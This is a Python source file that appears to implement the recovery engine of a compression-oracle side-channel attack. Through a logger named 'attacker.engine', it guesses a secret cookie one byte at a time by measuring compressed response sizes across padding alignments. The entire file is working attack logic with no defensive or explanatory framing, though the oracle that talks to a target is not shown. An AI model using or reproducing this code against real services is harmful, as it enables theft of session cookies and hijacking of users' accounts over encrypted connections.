import logging
import statistics
from collections.abc import Iterable

LOG = logging.getLogger("attacker.engine")

ALIGNMENT_COUNT = 8


def locked(
    ranked: list[bytes],
    samples: dict[bytes, list[int]],
    min_margin: int,
    min_agreement: int,
) -> bool:
    if len(ranked) < 2:
        return False
    top, runner = ranked[0], ranked[1]
    median_top = statistics.median(samples[top])
    median_runner = statistics.median(samples[runner])
    if median_runner - median_top < min_margin:
        return False
    return _alignment_agreement(top, samples) >= min_agreement


def _alignment_agreement(top: bytes, samples: dict[bytes, list[int]]) -> int:
    wins = 0
    for align_idx in range(ALIGNMENT_COUNT):
        top_at = _slice_alignment(samples[top], align_idx)
        if not top_at:
            continue
        top_min = statistics.median(top_at)
        better = True
        for cand, cand_samples in samples.items():
            if cand == top:
                continue
            cand_at = _slice_alignment(cand_samples, align_idx)
            if not cand_at:
                continue
            if statistics.median(cand_at) <= top_min:
                better = False
                break
        if better:
            wins += 1
    return wins


def _slice_alignment(samples: list[int], align_idx: int) -> list[int]:
    return samples[align_idx::ALIGNMENT_COUNT]


class RecoveryFailed(RuntimeError):
    pass


async def find_next_byte(
    oracle,
    prefix: bytes,
    byte_index: int,
    min_margin: int,
    min_agreement: int,
    max_rounds: int,
) -> bytes:
    candidates = [bytes([c]) for c in range(256)]
    samples: dict[bytes, list[int]] = {c: [] for c in candidates}

    for round_idx in range(max_rounds):
        for cand in candidates:
            for align_len in range(ALIGNMENT_COUNT):
                size = await oracle(prefix, cand, align_len)
                samples[cand].append(size)

        ranked = sorted(candidates, key=lambda c: statistics.median(samples[c]))
        top_med = statistics.median(samples[ranked[0]])
        runner_med = statistics.median(samples[ranked[1]])
        agree = _alignment_agreement(ranked[0], samples)
        LOG.info(
            "byte=%d round=%d top=0x%02x med=%d runner=0x%02x med=%d margin=%d agree=%d/%d",
            byte_index, round_idx + 1,
            ranked[0][0], top_med,
            ranked[1][0], runner_med,
            runner_med - top_med, agree, ALIGNMENT_COUNT,
        )
        if locked(ranked, samples, min_margin, min_agreement):
            LOG.info("byte=%d locked at 0x%02x", byte_index, ranked[0][0])
            return ranked[0]

    raise RecoveryFailed(
        f"position {byte_index} did not lock after {max_rounds} rounds"
    )


async def run_attack(
    oracle,
    cookie_length: int,
    min_margin: int,
    min_agreement: int,
    max_rounds: int,
) -> bytes:
    recovered = b""
    for byte_index in range(cookie_length):
        winner = await find_next_byte(
            oracle=oracle,
            prefix=recovered,
            byte_index=byte_index,
            min_margin=min_margin,
            min_agreement=min_agreement,
            max_rounds=max_rounds,
        )
        recovered += winner
    return recovered
